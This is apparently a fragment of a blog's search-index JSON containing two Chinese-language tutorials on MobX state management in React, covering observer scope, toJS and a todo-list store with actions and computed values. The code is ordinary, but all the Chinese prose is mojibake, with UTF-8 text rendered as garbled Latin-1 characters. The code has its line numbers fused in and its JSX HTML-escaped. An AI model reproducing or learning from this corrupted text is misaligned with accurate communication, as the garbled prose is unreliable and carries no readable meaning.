å°±æ˜¯ä¸€å€‹å¾ˆåŸºæœ¬çš„å°è¦½åˆ—å’Œè·¯ç”±ï¼Œé•·å¾—åƒé€™æ¨£ï¼š æˆ‘é€™é‚Šæƒ³åšçš„äº‹æƒ…å¾ˆç°¡å–®ï¼Œå°±æ˜¯åœ¨ store ä¸­å»ºç«‹ä¸€å€‹ isInit çš„ stateï¼Œç„¶å¾Œæˆ‘å¸Œæœ›ä¸Šé¢ç´…è‰²æ¡†æ¡†çš„å…©å€‹æŒ‰éˆ•åªæœ‰åœ¨ isInit=true æ™‚æ‰é¡¯ç¤ºå‡ºä¾†ã€‚ æ‰€ä»¥é€™é‚Šçš„ store è·Ÿ action å°±æœƒé€™æ¨£å¯«ï¼š 12345678910// storeimport { observable } from 'mobx'export const AuthStorage = observable({ isInit: false, get getIsinit() { return this.isInit }}) 1234567// actionimport { action } from 'mobx'import { AuthStorage } from '../store/auth'export const checkStorage = action(() =&gt; { AuthStorage.isInit = true}) é™„è¨»ï¼šå¦‚æœä½ ä¸²é JWT çš„è©±å¤§æ¦‚å°±æœƒçŸ¥é“é€™æ˜¯èµ·æ‰‹å¼ï¼Œåªæ˜¯é€™é‚Šç‚ºäº†ç°¡åŒ–æ‰€ä»¥ä¸æœƒçœŸçš„å»æª¢æŸ¥ storageã€‚ æ¥ä¸‹ä¾†ï¼Œç‚ºäº†åœ¨é€²å…¥é é¢æ™‚å®Œæˆã€Œåˆå§‹åŒ–ã€çš„å‹•ä½œï¼Œæˆ‘å€‘æœƒç”¨ useEffect ä¾†è™•ç†ï¼Œåƒé€™æ¨£ï¼š 123456789101112131415161718192021222324// æ³¨æ„é€™é‚Šæœ‰ç”¨ observer ä¾†è§€æ¸¬const App = observer(() =&gt; { console.log('render app') useEffect(() =&gt; { // set isInit to true setTimeout(() =&gt; { checkStorage() }, 1000) }, []) return ( &lt;div className='app'&gt; &lt;HashRouter&gt; &lt;Header /&gt; &lt;Routes&gt; &lt;Route path='' element={&lt;div&gt;hello&lt;/div&gt;} /&gt; &lt;Route path='login' element={&lt;Login /&gt;} /&gt; &lt;/Routes&gt; &lt;/HashRouter&gt; &lt;/div&gt; )})export default App æ¥ä¸‹ä¾†ä½ å¯èƒ½å°±å¾ˆé–‹å¿ƒçš„å» &lt;Header /&gt; ä¸­æŠŠ isInit æ‹¿å‡ºä¾†ç”¨ï¼Œåƒé€™æ¨£ï¼š 1234567891011121314151617181920212223242526272829303132333435const Header = () =&gt; { return ( &lt;div style={styles.container}&gt; &lt;h1 style={styles.title}&gt; &lt;Link to='/' style={styles.link}&gt; Home &lt;/Link&gt; &lt;/h1&gt; &lt;ul style={styles.list}&gt; &lt;li&gt; &lt;Link style={styles.link} to='login'&gt; default &lt;/Link&gt; &lt;/li&gt; {/* åŠ ä¸Šæ¢ä»¶æ¸²æŸ“ */} {AuthStorage.getIsinit &amp;&amp; ( &lt;&gt; &lt;li&gt; &lt;Link style={styles.link} to='login'&gt; Link1 &lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link style={styles.link} to='login'&gt; Link2 &lt;/Link&gt; &lt;/li&gt; &lt;/&gt; )} &lt;/ul&gt; &lt;/div&gt; )}export default Header é™„è¨»ï¼šå¯ä»¥åˆ°é€™é‚Šçœ‹ ç¯„ä¾‹ æœƒæ›´æ¸…æ¥š ç„¶å¾Œä½ å°±æœƒç™¼ç¾ä¸€ç§’éå¾Œä»€éº¼äº‹æƒ…ä¹Ÿæ²’ç™¼ç”Ÿï¼Œè·Ÿä½ æƒ³çš„ä¸ä¸€æ¨£ã€‚ ç‚ºä»€éº¼ï¼Ÿæˆ‘æ˜æ˜å·²ç¶“ç”¨ observer ä¾†è§€æ¸¬æ•´å€‹ App äº†å•Šï¼Œç…§ç†ä¾†èªªåªè¦æœ‰ä»»ä½• state æ”¹è®Šäº†ä¸å°±æ‡‰è©²é‡æ–°æ¸²æŸ“å—ï¼Ÿ è¦è§£é–‹é€™å€‹å•é¡Œï¼Œé¦–å…ˆè¦é‡æ¸…ä¸€ä»¶äº‹æƒ…ï¼šã€Œobserver çš„è§€å¯Ÿç¯„åœåœ¨å“ªè£¡ï¼Ÿã€ ä»¥ä¸Šé¢çš„ä¾‹å­ä¾†èªªï¼Œobserver çš„è§€å¯Ÿç¯„åœå°±åƒ…é™æ–¼ App é€™å€‹å…ƒä»¶æœ¬èº«è€Œå·²ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œé‚£éº¼æ€è€ƒä¸€ä»¶äº‹æƒ…ï¼ŒApp ä¸­æœ‰æ²’æœ‰ç”¨åˆ°ä»»ä½•ã€Œobservableï¼ˆè¢«è§€å¯Ÿï¼‰ã€çš„å€¼ï¼Ÿ ç­”æ¡ˆæ˜¯æ²’æœ‰ï¼Œå¿˜è¨˜çš„è©±ä½ å¯ä»¥æ‹‰ä¸Šå»çœ‹ä¸€ä¸‹ã€‚ ä¹Ÿå°±æ˜¯èªªï¼Œåªæœ‰ç•¶ observer ä¸­å­˜åœ¨ observable æ™‚ï¼Œæ‰æœƒå†æ›´æ–°æ™‚è§¸ç™¼ re-renderã€‚ï¼ˆé€™ä¸€å¥è«‹ææ¸…æ¥š observer è·Ÿ observable çš„å·®çš„å·®åˆ¥ï¼Œä¸€å€‹æ˜¯è§€å¯Ÿè€…ï¼Œä¸€å€‹æ˜¯è¢«è§€å¯Ÿè€…ï¼‰ æ‰€ä»¥å¦‚æœè¦è®“ App è§¸ç™¼ re-renderï¼Œæœ€ç°¡å–®çš„åšæ³•å°±æ˜¯è®“ App è£¡é¢å‡ºç¾ observableï¼Œåƒé€™æ¨£ï¼š 123456789101112131415161718192021222324const App = observer(() =&gt; { console.log('render app') console.log('check observable', AuthStorage.getIsinit) useEffect(() =&gt; { // set isInit be true setTimeout(() =&gt; { checkStorage() }, 1000) }, []) return ( &lt;div className='app'&gt; &lt;HashRouter&gt; &lt;Header /&gt; &lt;Routes&gt; &lt;Route path='' element={&lt;div&gt;hello&lt;/div&gt;} /&gt; &lt;Route path='login' element={&lt;Login /&gt;} /&gt; &lt;/Routes&gt; &lt;/HashRouter&gt; &lt;/div&gt; )})export default App é€™æ™‚å€™ç¥å¥‡çš„äº‹æƒ…å°±ç™¼ç”Ÿäº†ï¼ŒçœŸçš„è§¸ç™¼ re-render äº†ï¼š é™„è¨»ï¼šç¯„ä¾‹å¯ä»¥åƒè€ƒé€™é‚Š å°±è·Ÿæˆ‘å€‘å‰›å‰›èªªçš„ä¸€æ¨£ï¼Œç¾åœ¨å› ç‚º App ä¸­å‡ºç¾äº† observableï¼Œæ‰€ä»¥ä¸€æ—¦é€™å€‹ observable ã€Œè¢«æ”¹è®Šäº†ã€ï¼ŒApp å°±æ‡‰è©²è¦ re-renderï¼Œé€™å°±æ˜¯èƒŒå¾Œçš„é“ç†è€Œå·²ï¼Œåˆ¥æƒ³å¾—å¤ªè¤‡é›œäº†ã€‚ æ‰€ä»¥å›åˆ°ä¸€é–‹å§‹çš„å•é¡Œï¼Œå¦‚æœæˆ‘æƒ³è®“ &lt;Header /&gt; èƒ½æ­£ç¢ºçš„è¢«é‡æ–°æ¸²æŸ“çš„è©±è©²æ€éº¼åšï¼Ÿ åªè¦å¹«ä»–åŠ ä¸Š observer å°±å¥½ï¼ˆå› ç‚º observable æ˜¯å‡ºç¾åœ¨å®ƒè£¡é¢çš„ï¼Œé€™å€‹æ‰æ˜¯æˆ‘å€‘çœŸæ­£è©²è§€å¯Ÿï¼ˆobserverï¼‰çš„å…ƒä»¶ï¼‰ï¼š 1234567891011121314151617181920212223242526272829303132333435// åŠ ä¸Š observerconst Header = observer(() =&gt; { return ( &lt;div style={styles.container}&gt; &lt;h1 style={styles.title}&gt; &lt;Link to='/' style={styles.link}&gt; Home &lt;/Link&gt; &lt;/h1&gt; &lt;ul style={styles.list}&gt; &lt;li&gt; &lt;Link style={styles.link} to='login'&gt; default &lt;/Link&gt; &lt;/li&gt; {AuthStorage.getIsinit &amp;&amp; ( &lt;&gt; &lt;li&gt; &lt;Link style={styles.link} to='login'&gt; Link1 &lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link style={styles.link} to='login'&gt; Link2 &lt;/Link&gt; &lt;/li&gt; &lt;/&gt; )} &lt;/ul&gt; &lt;/div&gt; )})export default Header é™„è¨»ï¼šç¯„ä¾‹åƒè€ƒé€™è£¡ ç¸½ä¹‹ï¼Œä¸€å®šè¦ææ¸…æ¥š observer çš„æ¶µè“‹ç¯„åœåœ¨å“ªè£¡ï¼Ÿå®ƒè·Ÿ observable çš„é—œä¿‚åˆæ˜¯ä»€éº¼ï¼Ÿæ˜¯ä¸€æ®µæƒ³è¬›çš„é‡è¦è§€å¿µã€‚ é—œæ–¼ toJSï¼ˆæ·±æ‹·è²ï¼‰é€™é‚Šæ˜¯æˆ‘å¾Œä¾†åœ¨åšå°ˆæ¡ˆæ™‚ç¢°åˆ°çš„ä¸€å€‹å•é¡Œï¼Œæ‰€ä»¥è¨˜éŒ„ä¸€ä¸‹ã€‚ ç°¡å–®ä¾†èªªä¸Šé¢çš„ç¯„ä¾‹å…¶å¯¦å¯ä»¥å†åˆ©ç”¨ computed çš„æ–¹å¼ä¾†å–å‡º stateï¼Œåƒé€™æ¨£ï¼š 123456789101112131415export const TodoStorage = observable({ // å­˜åœ¨ store ä¸­çš„ state todos: [ { id: 1, name: 'Test', completed: true } ] as Todo[], // æŠŠ state ç›´æ¥ç•¶ä½œ computed å‚³å‡ºå» get getTodos(): Todo[] { return this.todos }}) ç”¨çš„æ™‚å€™æœƒåƒé€™æ¨£ï¼š 12345678910111213const TodoList: React.FC = observer(() =&gt; { return ( &lt;&gt; &lt;ul&gt; {TodoStorage.getTodos.map((item) =&gt; ( &lt;li onClick={() =&gt; toggleTodo(item.id)} key={item.id}&gt; {item.name} &lt;/li&gt; ))} &lt;/ul&gt; &lt;/&gt; )}) ä½ å¯èƒ½æœƒæƒ³èªªæ˜æ˜èƒ½ç”¨ TodoStorage.todos æ‹¿å‡ºä¾†å°±å¥½äº†ï¼Œç‚ºä»€éº¼è¦é€™æ¨£å¯«ï¼Ÿ é€™æ˜¯å› ç‚ºå–®ç”¨ TodoStorage.todos æ‹¿å‡ºä¾†çš„è©±ï¼š ä»–æ˜¯æœ‰è¢«ä¿®æ”¹çš„é¢¨éšªåœ¨çš„ ä»–æ˜¯æœ‰è¢«ä¿®æ”¹çš„é¢¨éšªåœ¨çš„ ä»–æ˜¯æœ‰è¢«ä¿®æ”¹çš„é¢¨éšªåœ¨çš„ å› ç‚ºæˆ‘å€‘æ‹¿å‡ºä¾†çš„æ±è¥¿å…¶å¯¦æ˜¯ã€Œreferenceã€ï¼Œæ‰€ä»¥æˆ‘åªè¦åœ¨æ‹¿å‡ºä¾†çš„æ™‚å€™äº‚æ”¹ï¼Œå°±æœƒæ”¹åˆ°ã€ŒåŸæœ¬æ”¾åœ¨ storeã€ è£¡é¢çš„æ±è¥¿ï¼Œåƒé€™æ¨£ï¼š 1234567891011121314151617181920212223242526import React from 'react'import { TodoStorage } from '../state/storage/todo'import { toggleTodo } from '../state/action/todo'import { observer } from 'mobx-react-lite'const TodoList: React.FC = observer(() =&gt; { // æ‹¿å‡ºä¾†å¾Œäº‚æ”¹ TodoStorage.todos[0].name = 'yoyoyo' return ( &lt;&gt; &lt;ul&gt; {TodoStorage.todos.map((item) =&gt; { return ( &lt;li onClick={() =&gt; toggleTodo(item.id)} key={item.id}&gt; {/* åŸæœ¬æ˜¯ testï¼Œä½†æœƒè¢«æ”¹æˆ yoyoyo */} {item.name} &lt;/li&gt; ) })} &lt;/ul&gt; &lt;/&gt; )})export default TodoList é™„è¨»ï¼šä¸æ‡‚çš„è©±å¯ä»¥åˆ°é€™é‚Šçœ‹ç¯„ä¾‹ æ‰€ä»¥æ¯”è¼ƒä¿éšªçš„æ–¹å¼æ˜¯å…ˆæŠŠ state åšæ·±æ‹·è²ä»¥å¾Œå†æ‹¿å‡ºä¾†ï¼Œé€™æ¨£å­å°±ç®—ä¹‹å¾Œæ„å¤–çš„æ”¹åˆ° stateï¼Œé‚£ä¹Ÿä¸æœƒå½±éŸ¿åˆ° store è£¡é¢çš„æ±è¥¿ï¼ˆé€™å€‹å°±æ˜¯æ·±æ‹·è²çš„åŸç†ï¼Œä¸æ‡‚çš„è©±å›å»è¤‡ç¿’ï¼‰ã€‚ é€™æ™‚å€™å°±æœƒç”¨åˆ° toJS é€™å€‹æ–¹æ³•äº†ï¼Œä¾†æŠŠä¸€é–‹å§‹è¬›çš„æ–¹æ³•æ”¹æˆé€™æ¨£ï¼š 1234567891011121314export const TodoStorage = observable({ todos: [ { id: 1, name: \"Test\", completed: true } ] as Todo[], get getTodosWithToJS(): Todo[] { // åšæ·±æ‹·è²å¾Œåœ¨å›å‚³ return toJS(this.todos); }}); 12345678910111213141516171819202122232425import React from 'react'import { TodoStorage } from '../state/storage/todo'import { toggleTodo } from '../state/action/todo'import { observer } from 'mobx-react-lite'const TodoList: React.FC = observer(() =&gt; { // ä¸€æ¨£äº‚æ”¹å€¼ï¼Œä½†åªæœƒæ”¹åˆ°æ‹·è²å¾Œçš„ç‰©ä»¶ TodoStorage.getTodosWithToJS[0].name = 'yoyoyo' return ( &lt;&gt; &lt;ul&gt; {TodoStorage.todos.map((item) =&gt; { return ( &lt;li onClick={() =&gt; toggleTodo(item.id)} key={item.id}&gt; {/* ä¸æœƒå½±éŸ¿åˆ°åŸæœ¬çš„ todos */} {item.name} &lt;/li&gt; ) })} &lt;/ul&gt; &lt;/&gt; )})export default TodoList ä¸æ‡‚çš„è©±ä¸€æ¨£ä¾†é€™é‚Šçœ‹ç¯„ä¾‹ã€‚ ç¸½ä¹‹å‘¢ï¼ŒtoJS é€šå¸¸æ˜¯ç”¨åœ¨ä½ ã€Œæƒ³è¦æ‹¿ state ä¾†åšä¸€äº›è¨ˆç®—æ™‚ã€æœƒæ‹¿ä¾†ç”¨çš„æ±è¥¿ï¼Œç‚ºçš„å°±æ˜¯é¿å…åœ¨é€”ä¸­ä¸å°å¿ƒæ”¹åˆ° store è£¡çš„æ±è¥¿ï¼Œæ‰€ä»¥æ‰æœƒç”¨é€™ç¨®æ–¹å¼ä¾†ç›¡å¯èƒ½é¿å…æ‰ã€‚ å¦‚æœä½ çš„ state åªæ˜¯ç´”ç²¹æ‹¿ä¾† Read çš„è©±ï¼Œé‚£ä¸ç”¨é€™ç¨®æ–¹å¼ä¹Ÿæ²’é—œä¿‚ï¼Œä½†è¦çŸ¥é“è¦æœ‰é€™ç¨®ä½œæ³•å°±æ˜¯äº†ã€‚ æœ€å¾Œçš„é™„è¨»ï¼šé›–ç„¶æº–ç¢ºä¸€é»ä¾†èªª toJS çš„ç”¨é€”æ˜¯ã€Œå–æ¶ˆ observableã€ï¼Œä¸éæˆ‘è¦ºå¾—ç”¨ã€Œæ·±æ‹·è²ã€çš„æ–¹å¼ä¾†ç†è§£æœƒæ›´å¥½æ‡‚ä¸€é»ï¼ˆç•¶åˆå®Œå…¨è½ä¸æ‡‚ä»€éº¼å«å–æ¶ˆ observable XDï¼‰","link":"/2022/05/14/mobx-another-way-to-set-up/"},{"title":"ä¾†é»ä¸ä¸€æ¨£çš„ç‹€æ…‹ç®¡ç† mobx","text":"å…¶å¯¦æ¯” React ç°¡å–®å¾ˆå¤šã€‚ ç°¡è¿°æœ€è¿‘å› ç‚ºå·¥ä½œçš„é—œä¿‚ï¼Œå¾—å­¸ç¿’æ–°çš„å·¥å…·ã€‚ ä»¥ React ä¾†èˆ‰ä¾‹çš„è©±ï¼Œè¬›åˆ°ç‹€æ…‹ç®¡ç†å¤§å®¶ç¬¬ä¸€å€‹æƒ³åˆ°çš„æ‡‰è©²æ˜¯ reduxï¼Œä¸éå‰è¼©å»ºè­°æˆ‘å€‘è¦å¤šå­¸æ–°çš„æ±è¥¿ï¼Œæ‰€ä»¥é€™æ¬¡çš„å°ˆæ¡ˆä¸ç”¨ redux è€Œæ˜¯ mobxã€‚ æˆ‘è¦ºå¾—é€™æ¨£é‚„è »å¥½çš„ï¼Œé›–ç„¶è¦èŠ±æ™‚é–“å­¸æ–°æ±è¥¿ï¼Œä¸éä¹Ÿè »æœ‰è¶£çš„ã€‚ ç°¡å–®ä¾†èªªï¼Œmobx ä¹Ÿæ˜¯ä¸€å€‹ç‹€æ…‹ç®¡ç†çš„å·¥å…·ï¼Œä¸éä»–æ¯” redux æ›´ç°¡å–®ä¸€äº›ï¼Œä¹Ÿä¸éœ€è¦å¤ªå¤šçš„å‰ç½®ä½œæ¥­ï¼ˆboilerplateï¼‰ï¼Œåªè¦æŒæ¡ actionã€observe å’Œ computed å¹¾å€‹è§€å¿µå°±å·®ä¸å¤šäº†ã€‚ å››å¤§è¦ç´  storeï¼ˆclassï¼‰å„²å­˜æ‰€æœ‰è³‡è¨Šçš„åœ°æ–¹ observale è¦è§€å¯Ÿçš„ state action ç”¨ä¾†æ›´æ–° state çš„ function computed å‘Šè¨´ä½  store è£¡é¢çš„è³‡è¨Šï¼ˆé¡ä¼¼ derived state çš„æ¦‚å¿µï¼‰ ä¾†ä¸€å€‹ç°¡å–®çš„ Todo listå‡¡äº‹å¾ todo list é–‹å§‹éƒ½æœƒå¸æ”¶è »å¿«çš„ï¼Œæ‰€ä»¥é€™é‚Šä¸€æ¨£æœƒåšä¸€å€‹ä¾†ç•¶ç¤ºç¯„ã€‚ å»ºç«‹åŸºæœ¬å…ƒä»¶é€™é‚Šç‚ºäº†æ–¹ä¾¿èµ·è¦‹ï¼Œä¸æœƒæŠŠå…ƒä»¶æ‹†çš„å¤ªç´°ï¼Œåªæœƒå»ºç«‹ä¸€å€‹ TodoListï¼Œå¤§æ¦‚é•·é€™æ¨£ï¼š 1234567891011121314151617181920import React, { useState } from \"react\";// å…ˆç•™ç©ºï¼Œç­‰æœƒå…’è¦æŠŠ store çµ¦ç•¶ä½œ props å‚³é€²ä¾†interface Props {}export const TodoList: React.FC&lt;Props&gt; = (props) =&gt; { const [value, setValue] = useState&lt;string&gt;(\"\"); return ( &lt;div&gt; &lt;form onSubmit={e =&gt; { e.preventDefault(); }}&gt; &lt;input type=\"text\" value={value} onChange={e =&gt; setValue(e.target.value)} /&gt; &lt;button type=\"submit\"&gt;submit&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; )} å»ºç«‹ storeæ¥è‘—è¦ä¾†å»ºç«‹ store çš„éƒ¨åˆ†ã€‚ åœ¨é‚£ä¹‹å‰å…ˆè§£é‡‹ä¸€ä¸‹ï¼Œmobx è·Ÿ redux æœ€å¤§çš„ä¸åŒä¸éœ€è¦ä¸€å¤§å †å‰ç½®ä½œæ¥­ï¼Œå¦‚æœå°ˆæ¡ˆä¸å¤§çš„è©±ï¼Œå…¶å¯¦ä¸€å€‹æª”æ¡ˆå°±è »å¤ ç”¨äº†ã€‚ é¦–å…ˆè¦å»ºç«‹ä¸€å€‹ classï¼Œé€™å€‹ class å°±ä»£è¡¨ store çš„è—åœ–ï¼Œç„¶å¾Œæˆ‘å€‘è¦åšä¸‹é¢é€™å¹¾ä»¶äº‹ï¼š å»ºç«‹ todos å…§å®¹ï¼ˆstateï¼‰ è®“ todos è®Šæˆã€Œobservableã€ï¼ˆå¯è§€å¯Ÿçš„ï¼‰ å»ºç«‹ actionï¼ˆä¿®æ”¹ todosï¼‰ å¤§è‡´ä¸Šæ˜¯é€™æ¨£ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†ç”¨ code ä¾†èªªæ˜ï¼š 123456789101112131415161718192021222324252627282930313233import { action, makeObservable, observable } from \"mobx\"interface TodoItem { id: number, name: string, completed: boolean}class TodoStoreImpl { // å»ºç«‹ä¸€å€‹ todos çš„å±¬æ€§ // é€™å€‹å±¬æ€§å°±æ˜¯çµ¦å…¶ä»–äººå­˜å–çš„ state todos: TodoItem[] = [] // é€™é‚Šæœƒç”¨ makeObservable ä¾†åˆå§‹åŒ– // ç”¨é€”æ˜¯å‘Šè¨´ mobx ä»–è¦è§€å¯Ÿå“ªäº› state // é‚„æœ‰æˆ‘å€‘æœ‰å“ªäº› action è·Ÿ computedï¼ˆé€™å€‹å¾Œé¢æœƒå†ä»‹ç´¹ï¼‰ constructor() { makeObservable(this, { todos: observable, addTodo: action }) } // actionï¼Œèªªç©¿äº†å°±æ˜¯ä¸€å€‹ function è€Œå·² addTodo(name: string): void { const item: TodoItem = { id: new Date().getTime(), name, completed: false } this.todos.push(item); }} çœ‹å®Œä¸Šé¢çš„ code ä½ æ‡‰è©²å°±å¤§æ¦‚çŸ¥é“ action, makeObservable, observable çš„ç”¨é€”æ˜¯ä»€éº¼äº†ã€‚ é€™é‚Šåªè£œå……ä¸€ä¸‹ makeObservableï¼Œä»–æœƒæ¥æ”¶å…©å€‹åƒæ•¸ï¼š store çš„ instanceï¼ˆthisï¼‰ store è£¡çš„æ‰€æœ‰ property æ­¤å¤–ï¼Œæ‡‰è©²æœ‰æ³¨æ„åˆ°åœ¨ addTodo æ™‚ç«Ÿç„¶å¯ä»¥ç”¨ã€Œmutableã€çš„æ–¹å¼ä¾†æ›´æ–° stateï¼Ÿ é€™å€‹æ˜¯ mobx çš„ä¸€å€‹ç‰¹é»ï¼Œè®“ä½ å¯ä»¥ç”¨ mutable çš„æ–¹å¼ä¾†æ›´æ–° stateï¼Œå°±è·Ÿ redux-tool-kit çš„æ¦‚å¿µæœ‰é»åƒï¼Œæ‡‰è©²æ˜¯æœƒåœ¨èƒŒå¾Œå¹«ä½ åšä¸€äº›è™•ç†ï¼ˆæ‡‰è©²å•¦ï¼Œæˆ‘æ²’æ·±ç©¶ï¼‰ã€‚ æœ€å¾Œï¼Œå› ç‚ºæ‰€æœ‰çš„ Component æœƒå…±ç”¨åŒä¸€å€‹ instanceï¼Œæ‰€ä»¥æˆ‘å€‘çœŸæ­£è¦ export å‡ºå»çš„æœƒæ˜¯ new å‡ºä¾†çš„æ±è¥¿ï¼Œè€Œä¸æ˜¯ class æœ¬èº«ã€‚ æ‰€ä»¥é€™é‚Šè¦ new ä¸€å€‹ instance å‡ºä¾†ï¼Œå†æŠŠä»– export å‡ºå»ï¼š 12345678910111213141516171819202122232425262728293031import { action, makeObservable, observable } from \"mobx\"interface TodoItem { id: number, name: string, completed: boolean}// é€™é‚Š export çš„ç”¨é€”æ˜¯æ‹¿ä¾†çµ¦ typescript ç”¨çš„export class TodoStoreImpl { todos: TodoItem[] = [] constructor() { makeObservable(this, { todos: observable, addTodo: action }) } addTodo(name: string): void { const item: TodoItem = { id: new Date().getTime(), name, completed: false } this.todos.push(item); }}// æŠŠ instance è¼¸å‡ºexport const TodoStore = new TodoStoreImpl(); æ¥è‘—å›åˆ° index.js çš„éƒ¨åˆ†ï¼Œå®ƒè¦åšçš„äº‹æƒ…åªæœ‰ä¸€å€‹ï¼Œå°±æ˜¯ã€ŒæŠŠ store å¼•å…¥ï¼Œç„¶å¾Œå‚³çµ¦ TodoListã€ï¼š 123456789101112131415import React from 'react';import ReactDOM from 'react-dom/client';import './index.css';import TodoList from './TodoList';// å¼•å…¥ storeimport { TodoStore } from './TodoStore';const root = ReactDOM.createRoot( document.getElementById('root') as HTMLElement);root.render( // ç•¶ä½œ props å‚³ä¸‹å» &lt;TodoList todoStore={TodoStore} /&gt;); æœ€å¾Œå†å›ä¾†èª¿æ•´ä¸€ä¸‹ TodoList çš„éƒ¨åˆ†ï¼Œæ—¢ç„¶ç¾åœ¨å·²ç¶“æ‹¿åˆ° store äº†ï¼Œå°±ä»£è¡¨å®ƒå¯ä»¥é€é store ä¾†å­˜å– todos è·Ÿ addTodo é€™å…©å€‹æ±è¥¿ã€‚ æ‰€ä»¥å¯ä»¥æ”¹æˆé€™æ¨£ï¼š 1234567891011121314151617181920212223242526272829303132import React, { useState } from \"react\";import { TodoStoreImpl } from \"./TodoStore\";// å¹« props è¨­å®š typeinterface Props { todoStore: TodoStoreImpl}// é€é props æ‹¿åˆ° todoStoreexport const TodoList: React.FC&lt;Props&gt; = ({ todoStore }) =&gt; { const [value, setValue] = useState&lt;string&gt;(\"\"); return ( &lt;div&gt; &lt;form onSubmit={e =&gt; { e.preventDefault(); if (value) { // é€é store å‘¼å« addTodo todoStore.addTodo(value); setValue(\"\"); } }}&gt; &lt;input type=\"text\" value={value} onChange={e =&gt; setValue(e.target.value)} /&gt; &lt;button type=\"submit\"&gt;submit&lt;/button&gt; &lt;/form&gt; {/* é€é store æ‹¿åˆ° state çš„è³‡è¨Š */} &lt;ul&gt; {todoStore.todos.map(todo =&gt; &lt;li key={todo.id}&gt;{todo.name}&lt;/li&gt;)} &lt;/ul&gt; &lt;/div&gt; )} é—œæ–¼ observer å’Œ HOCåšåˆ°é€™é‚Šï¼Œä½ æ‡‰è©²å°±å¯ä»¥æ–°å¢ todoï¼Œç„¶å¾Œé€é action å»æ”¹è®Š store è£¡é¢çš„ todosã€‚å¯æ˜¯ä½ æœƒç™¼ç¾ä¸€å€‹å•é¡Œï¼Œé‚£å°±æ˜¯ç•«é¢ä¸æœƒæ›´æ–°ã€‚ é™„è¨»ï¼šé›–ç„¶æˆ‘å¯¦ä½œçš„çµæœå…¶å¯¦æ˜¯æœƒæ›´æ–°ï¼Œä½†ä¸ç¢ºå®šæ˜¯ä¸æ˜¯ mobx å¾Œä¾†æœ‰åšä»€éº¼æ›´æ–°çš„åŸå› ï¼Œç¸½ä¹‹é‚„æ˜¯é¿å…é€™æ¨£å¯«æ¯”è¼ƒå¥½ã€‚ ç‚ºä»€éº¼ï¼Ÿ é€™æ˜¯å› ç‚ºç•¶æˆ‘å€‘æ–°å¢ todo æ™‚ï¼Œæœƒæ”¹è®Šçš„æ˜¯ store è£¡çš„ propertyï¼Œè€Œä¸æ˜¯ todoStore é€™å€‹ propsï¼ˆinstanceï¼‰ã€‚ æ—¢ç„¶ props æ²’æœ‰è®Šï¼ŒComponent è‡ªç„¶å°±ä¸æœƒ re-renderï¼Œç•«é¢ä¹Ÿç•¶ç„¶ä¸æœƒæ›´æ–°ã€‚ æ‰€ä»¥å‘¢ï¼Œé™¤äº†æŠŠ todoStore å‚³çµ¦ Component ä»¥å¤–ï¼Œé‚„è¦å¹« Component ç”¨ä¸€å±¤ observale åŒ…ä½ï¼Œä¹Ÿå°±æ˜¯ HOCï¼ˆHigher Order Componentï¼‰çš„æ‰‹æ³•ï¼š 123456789101112131415161718192021222324252627282930import { observer } from \"mobx-react-lite\";import React, { useState } from \"react\";import { TodoStoreImpl } from \"./TodoStore\";interface Props { todoStore: TodoStoreImpl}// ä¸å¤ªæ‡‚çš„è©±å¯ä»¥æƒ³æˆé€™æ¨£ï¼šobserver(&lt;TodoList /&gt;)export const TodoList: React.FC&lt;Props&gt; = observer(({ todoStore }) =&gt; { const [value, setValue] = useState&lt;string&gt;(\"\"); return ( &lt;div&gt; &lt;form onSubmit={e =&gt; { e.preventDefault(); if (value) { todoStore.addTodo(value); setValue(\"\"); } }}&gt; &lt;input type=\"text\" value={value} onChange={e =&gt; setValue(e.target.value)} /&gt; &lt;button type=\"submit\"&gt;submit&lt;/button&gt; &lt;/form&gt; &lt;ul&gt; {todoStore.todos.map(todo =&gt; &lt;li key={todo.id}&gt;{todo.name}&lt;/li&gt;)} &lt;/ul&gt; &lt;/div&gt; )}) åšåˆ°é€™é‚Šä»¥å¾Œï¼Œç•«é¢æ‡‰è©²å°±æœƒè‡ªå‹•æ›´æ–°äº†ï¼š æ¥è‘—è«‹ä½ è‡ªå·±å†åšä¸€å€‹ toggleTodo çš„åŠŸèƒ½ï¼Œä¸¦ä¸”ç•«é¢ä¸Šé¡¯ç¤ºå·²å®Œæˆ / æœªå®Œæˆçš„ç‹€æ…‹ï¼ˆæ¦‚å¿µéƒ½å·®ä¸å¤šï¼Œæ‰€ä»¥é€™é‚Šå°±ä¸ç¤ºç¯„äº†ï¼‰ã€‚ computedæœ€å¾Œè¦ä»‹ç´¹çš„æ˜¯ computedï¼Œé¡§åæ€ç¾©æ˜¯ç”¨ä¾†åšã€Œè¨ˆç®—ã€çš„æ±è¥¿ã€‚åœ¨é€™å€‹ä¾‹å­è£¡ï¼Œæˆ‘å€‘å¯ä»¥æ‹¿å®ƒä¾†è¨ˆç®— todo çš„å·²å®Œæˆ / æœªå®Œæˆæ•¸é‡ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import { action, computed, makeObservable, observable } from \"mobx\";interface TodoItem { id: number; name: string; completed: boolean;}export class TodoStoreImpl { todos: TodoItem[] = []; constructor() { makeObservable(this, { todos: observable, addTodo: action, toggleTodo: action, states: computed // è¨˜å¾—ä¸€æ¨£è¦æ”¾åˆ°é€™é‚Šåˆå§‹åŒ– }); } addTodo(name: string): void { const item: TodoItem = { id: new Date().getTime(), name, completed: false }; this.todos.push(item); } toggleTodo(id: number): void { const index = this.todos.findIndex((item) =&gt; item.id === id); if (index &gt; -1) { this.todos[index].completed = !this.todos[index].completed; } } // è¦ç”¨ get é—œéµå­—ä¾†å®£å‘Š computed get states() { let completed: number = 0; let remaining: number = 0; // è¨ˆç®—å·²å®Œæˆ / æœªå®Œæˆæ•¸é‡ this.todos.forEach((item) =&gt; { if (item.completed) { completed++; } else { remaining++; } }); return { completed, remaining }; }}export const TodoStore = new TodoStoreImpl(); åšåˆ°é€™é‚Šå¾Œï¼Œå…¶å¯¦å°±å·®ä¸å¤šæŠŠ mobx çš„åŸºç¤å­¸å®Œäº†ï¼Œæ­å–œæ­å–œï¼ å¦‚æœä½ 